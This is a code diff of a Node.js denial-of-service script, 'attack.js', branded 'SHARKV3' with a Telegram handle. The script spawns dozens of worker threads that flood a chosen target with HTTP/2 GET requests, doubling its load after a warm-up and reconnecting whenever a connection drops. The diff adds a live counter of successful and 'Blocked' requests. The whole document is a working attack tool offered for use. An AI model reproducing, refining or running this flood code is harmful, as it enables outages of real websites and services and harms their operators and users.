@@ -1,26 +1,19 @@
 const http2 = require('http2');
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const { cpus } = require('os');
+const readline = require('readline');
 
-const THREADS = 16;  // Use 16 threads initially, as you have 16 vCPUs
-const INITIAL_CONNECTIONS = 20;  // Initial number of connections per worker
-const POWER_MULTIPLIER = 2;  // Power increase factor
-const WARMUP_TIME = 5000;  // 5 seconds warm-up before full load
+const THREADS = 16;
+const INITIAL_CONNECTIONS = 20;
+const POWER_MULTIPLIER = 2;
+const WARMUP_TIME = 5000;
 
-let peakRps = 0;
-let requestCount = 0;
-let startTime = Date.now();
+let totalRequests = 0;
+let successCount = 0;
+let errorCount = 0;
+let maxRps = 0;
+let rpsLastSecond = 0;
 
-// Function to log RPS
-function logRps() {
-    const currentTime = Date.now();
-    const elapsedSeconds = (currentTime - startTime) / 1000;
-    const rps = requestCount / elapsedSeconds;
-    peakRps = Math.max(peakRps, rps);
-    console.log(`Peak RPS: ${peakRps.toFixed(2)}`);
-}
-
-// Worker logic to handle requests
 if (isMainThread) {
     if (process.argv.length < 4) {
         console.error('Usage: node attack.js <target> <duration_secs>');
@@ -30,65 +23,106 @@ if (isMainThread) {
     const target = process.argv[2];
     const duration = parseInt(process.argv[3]);
 
-    console.log(`Launching attack on ${target} for ${duration}s with ${THREADS} threads...`);
-
-    // Start with initial power (THREADS x INITIAL_CONNECTIONS)
-    for (let i = 0; i < THREADS; i++) {
-        new Worker(__filename, { workerData: { target, duration, initial: true } });
-    }
-
-    // After the warm-up period (5 seconds), double the power
+    console.clear();
+    console.log(`Warming up... Starting attack in 5s`);
     setTimeout(() => {
-        console.log('Doubling the power after warm-up period...');
-        // Increase the number of threads and connections for the next phase
-        for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-            new Worker(__filename, { workerData: { target, duration, initial: false } });
+        console.clear();
+        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
+        console.log(`===========================`);
+        for (let i = 0; i < THREADS; i++) {
+            new Worker(__filename, { workerData: { target, duration, initial: true } });
         }
+
+        setTimeout(() => {
+            for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
+                new Worker(__filename, { workerData: { target, duration, initial: false } });
+            }
+        }, WARMUP_TIME);
+
+        // Update live stats every second
+        setInterval(() => {
+            maxRps = Math.max(maxRps, rpsLastSecond);
+            renderStats();
+            rpsLastSecond = 0;
+        }, 1000);
+
     }, WARMUP_TIME);
 
-    // Periodically log peak RPS
-    setInterval(logRps, 1000);
+    function renderStats() {
+        readline.cursorTo(process.stdout, 0, 0);
+        readline.clearScreenDown(process.stdout);
+        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
+        console.log(`===========================`);
+        console.log(`total: ${totalRequests}`);
+        console.log(`max-r: ${maxRps}`);
+        console.log(`===========================`);
+        console.log(`succes: ${successCount}`);
+        console.log(`Blocked: ${errorCount}`);
+    }
 
+    // Listen to stats from workers
+    const { createServer } = require('net');
+    const IPC_PORT = 9999;
+    const server = createServer(socket => {
+        socket.on('data', data => {
+            const msg = data.toString();
+            if (msg === 'req') {
+                totalRequests++;
+                rpsLastSecond++;
+            } else if (msg === 'ok') {
+                successCount++;
+            } else if (msg === 'err') {
+                errorCount++;
+            }
+        });
+    });
+    server.listen(IPC_PORT);
 } else {
+    const net = require('net');
     const { target, duration, initial } = workerData;
     const end = Date.now() + duration * 1000;
-    let connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
+    const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
+
+    const socket = net.connect(9999, '127.0.0.1');
+
+    function sendStat(msg) {
+        socket.write(msg);
+    }
 
     function startFlood(client) {
-        const floodInterval = setInterval(() => {
+        const flood = setInterval(() => {
             if (Date.now() > end) {
-                clearInterval(floodInterval);
+                clearInterval(flood);
                 return;
             }
 
-            try {
-                // Fire a high number of concurrent requests (aggressive flooding)
-                for (let i = 0; i < 1000; i++) {
+            for (let i = 0; i < 1000; i++) {
+                try {
                     const req = client.request({ ':path': '/', ':method': 'GET' });
-                    req.on('error', () => {});
+                    req.on('response', () => sendStat('ok'));
+                    req.on('error', () => sendStat('err'));
                     req.end();
-                    requestCount++;  // Increment total request count for RPS calculation
+                    sendStat('req');
+                } catch {
+                    sendStat('err');
                 }
-            } catch (err) {
-                // Ignore errors but continue flooding
             }
-        }, 0); // Immediate request firing for max load
+        }, 0);
     }
 
     function createConnection() {
         let client;
         try {
             client = http2.connect(target);
-        } catch (err) {
-            return setTimeout(createConnection, 250);  // Retry connection
+        } catch {
+            return setTimeout(createConnection, 250);
         }
 
-        client.on('error', () => {});  // Ignore connection errors
-        client.on('close', () => setTimeout(createConnection, 100));  // Reconnect on close
-        client.on('connect', () => startFlood(client));  // Start flooding when connected
+        client.on('error', () => {});
+        client.on('close', () => setTimeout(createConnection, 100));
+        client.on('connect', () => startFlood(client));
     }
 
-    // Create multiple connections per worker
     for (let i = 0; i < connections; i++) {
         createConnection();
     }
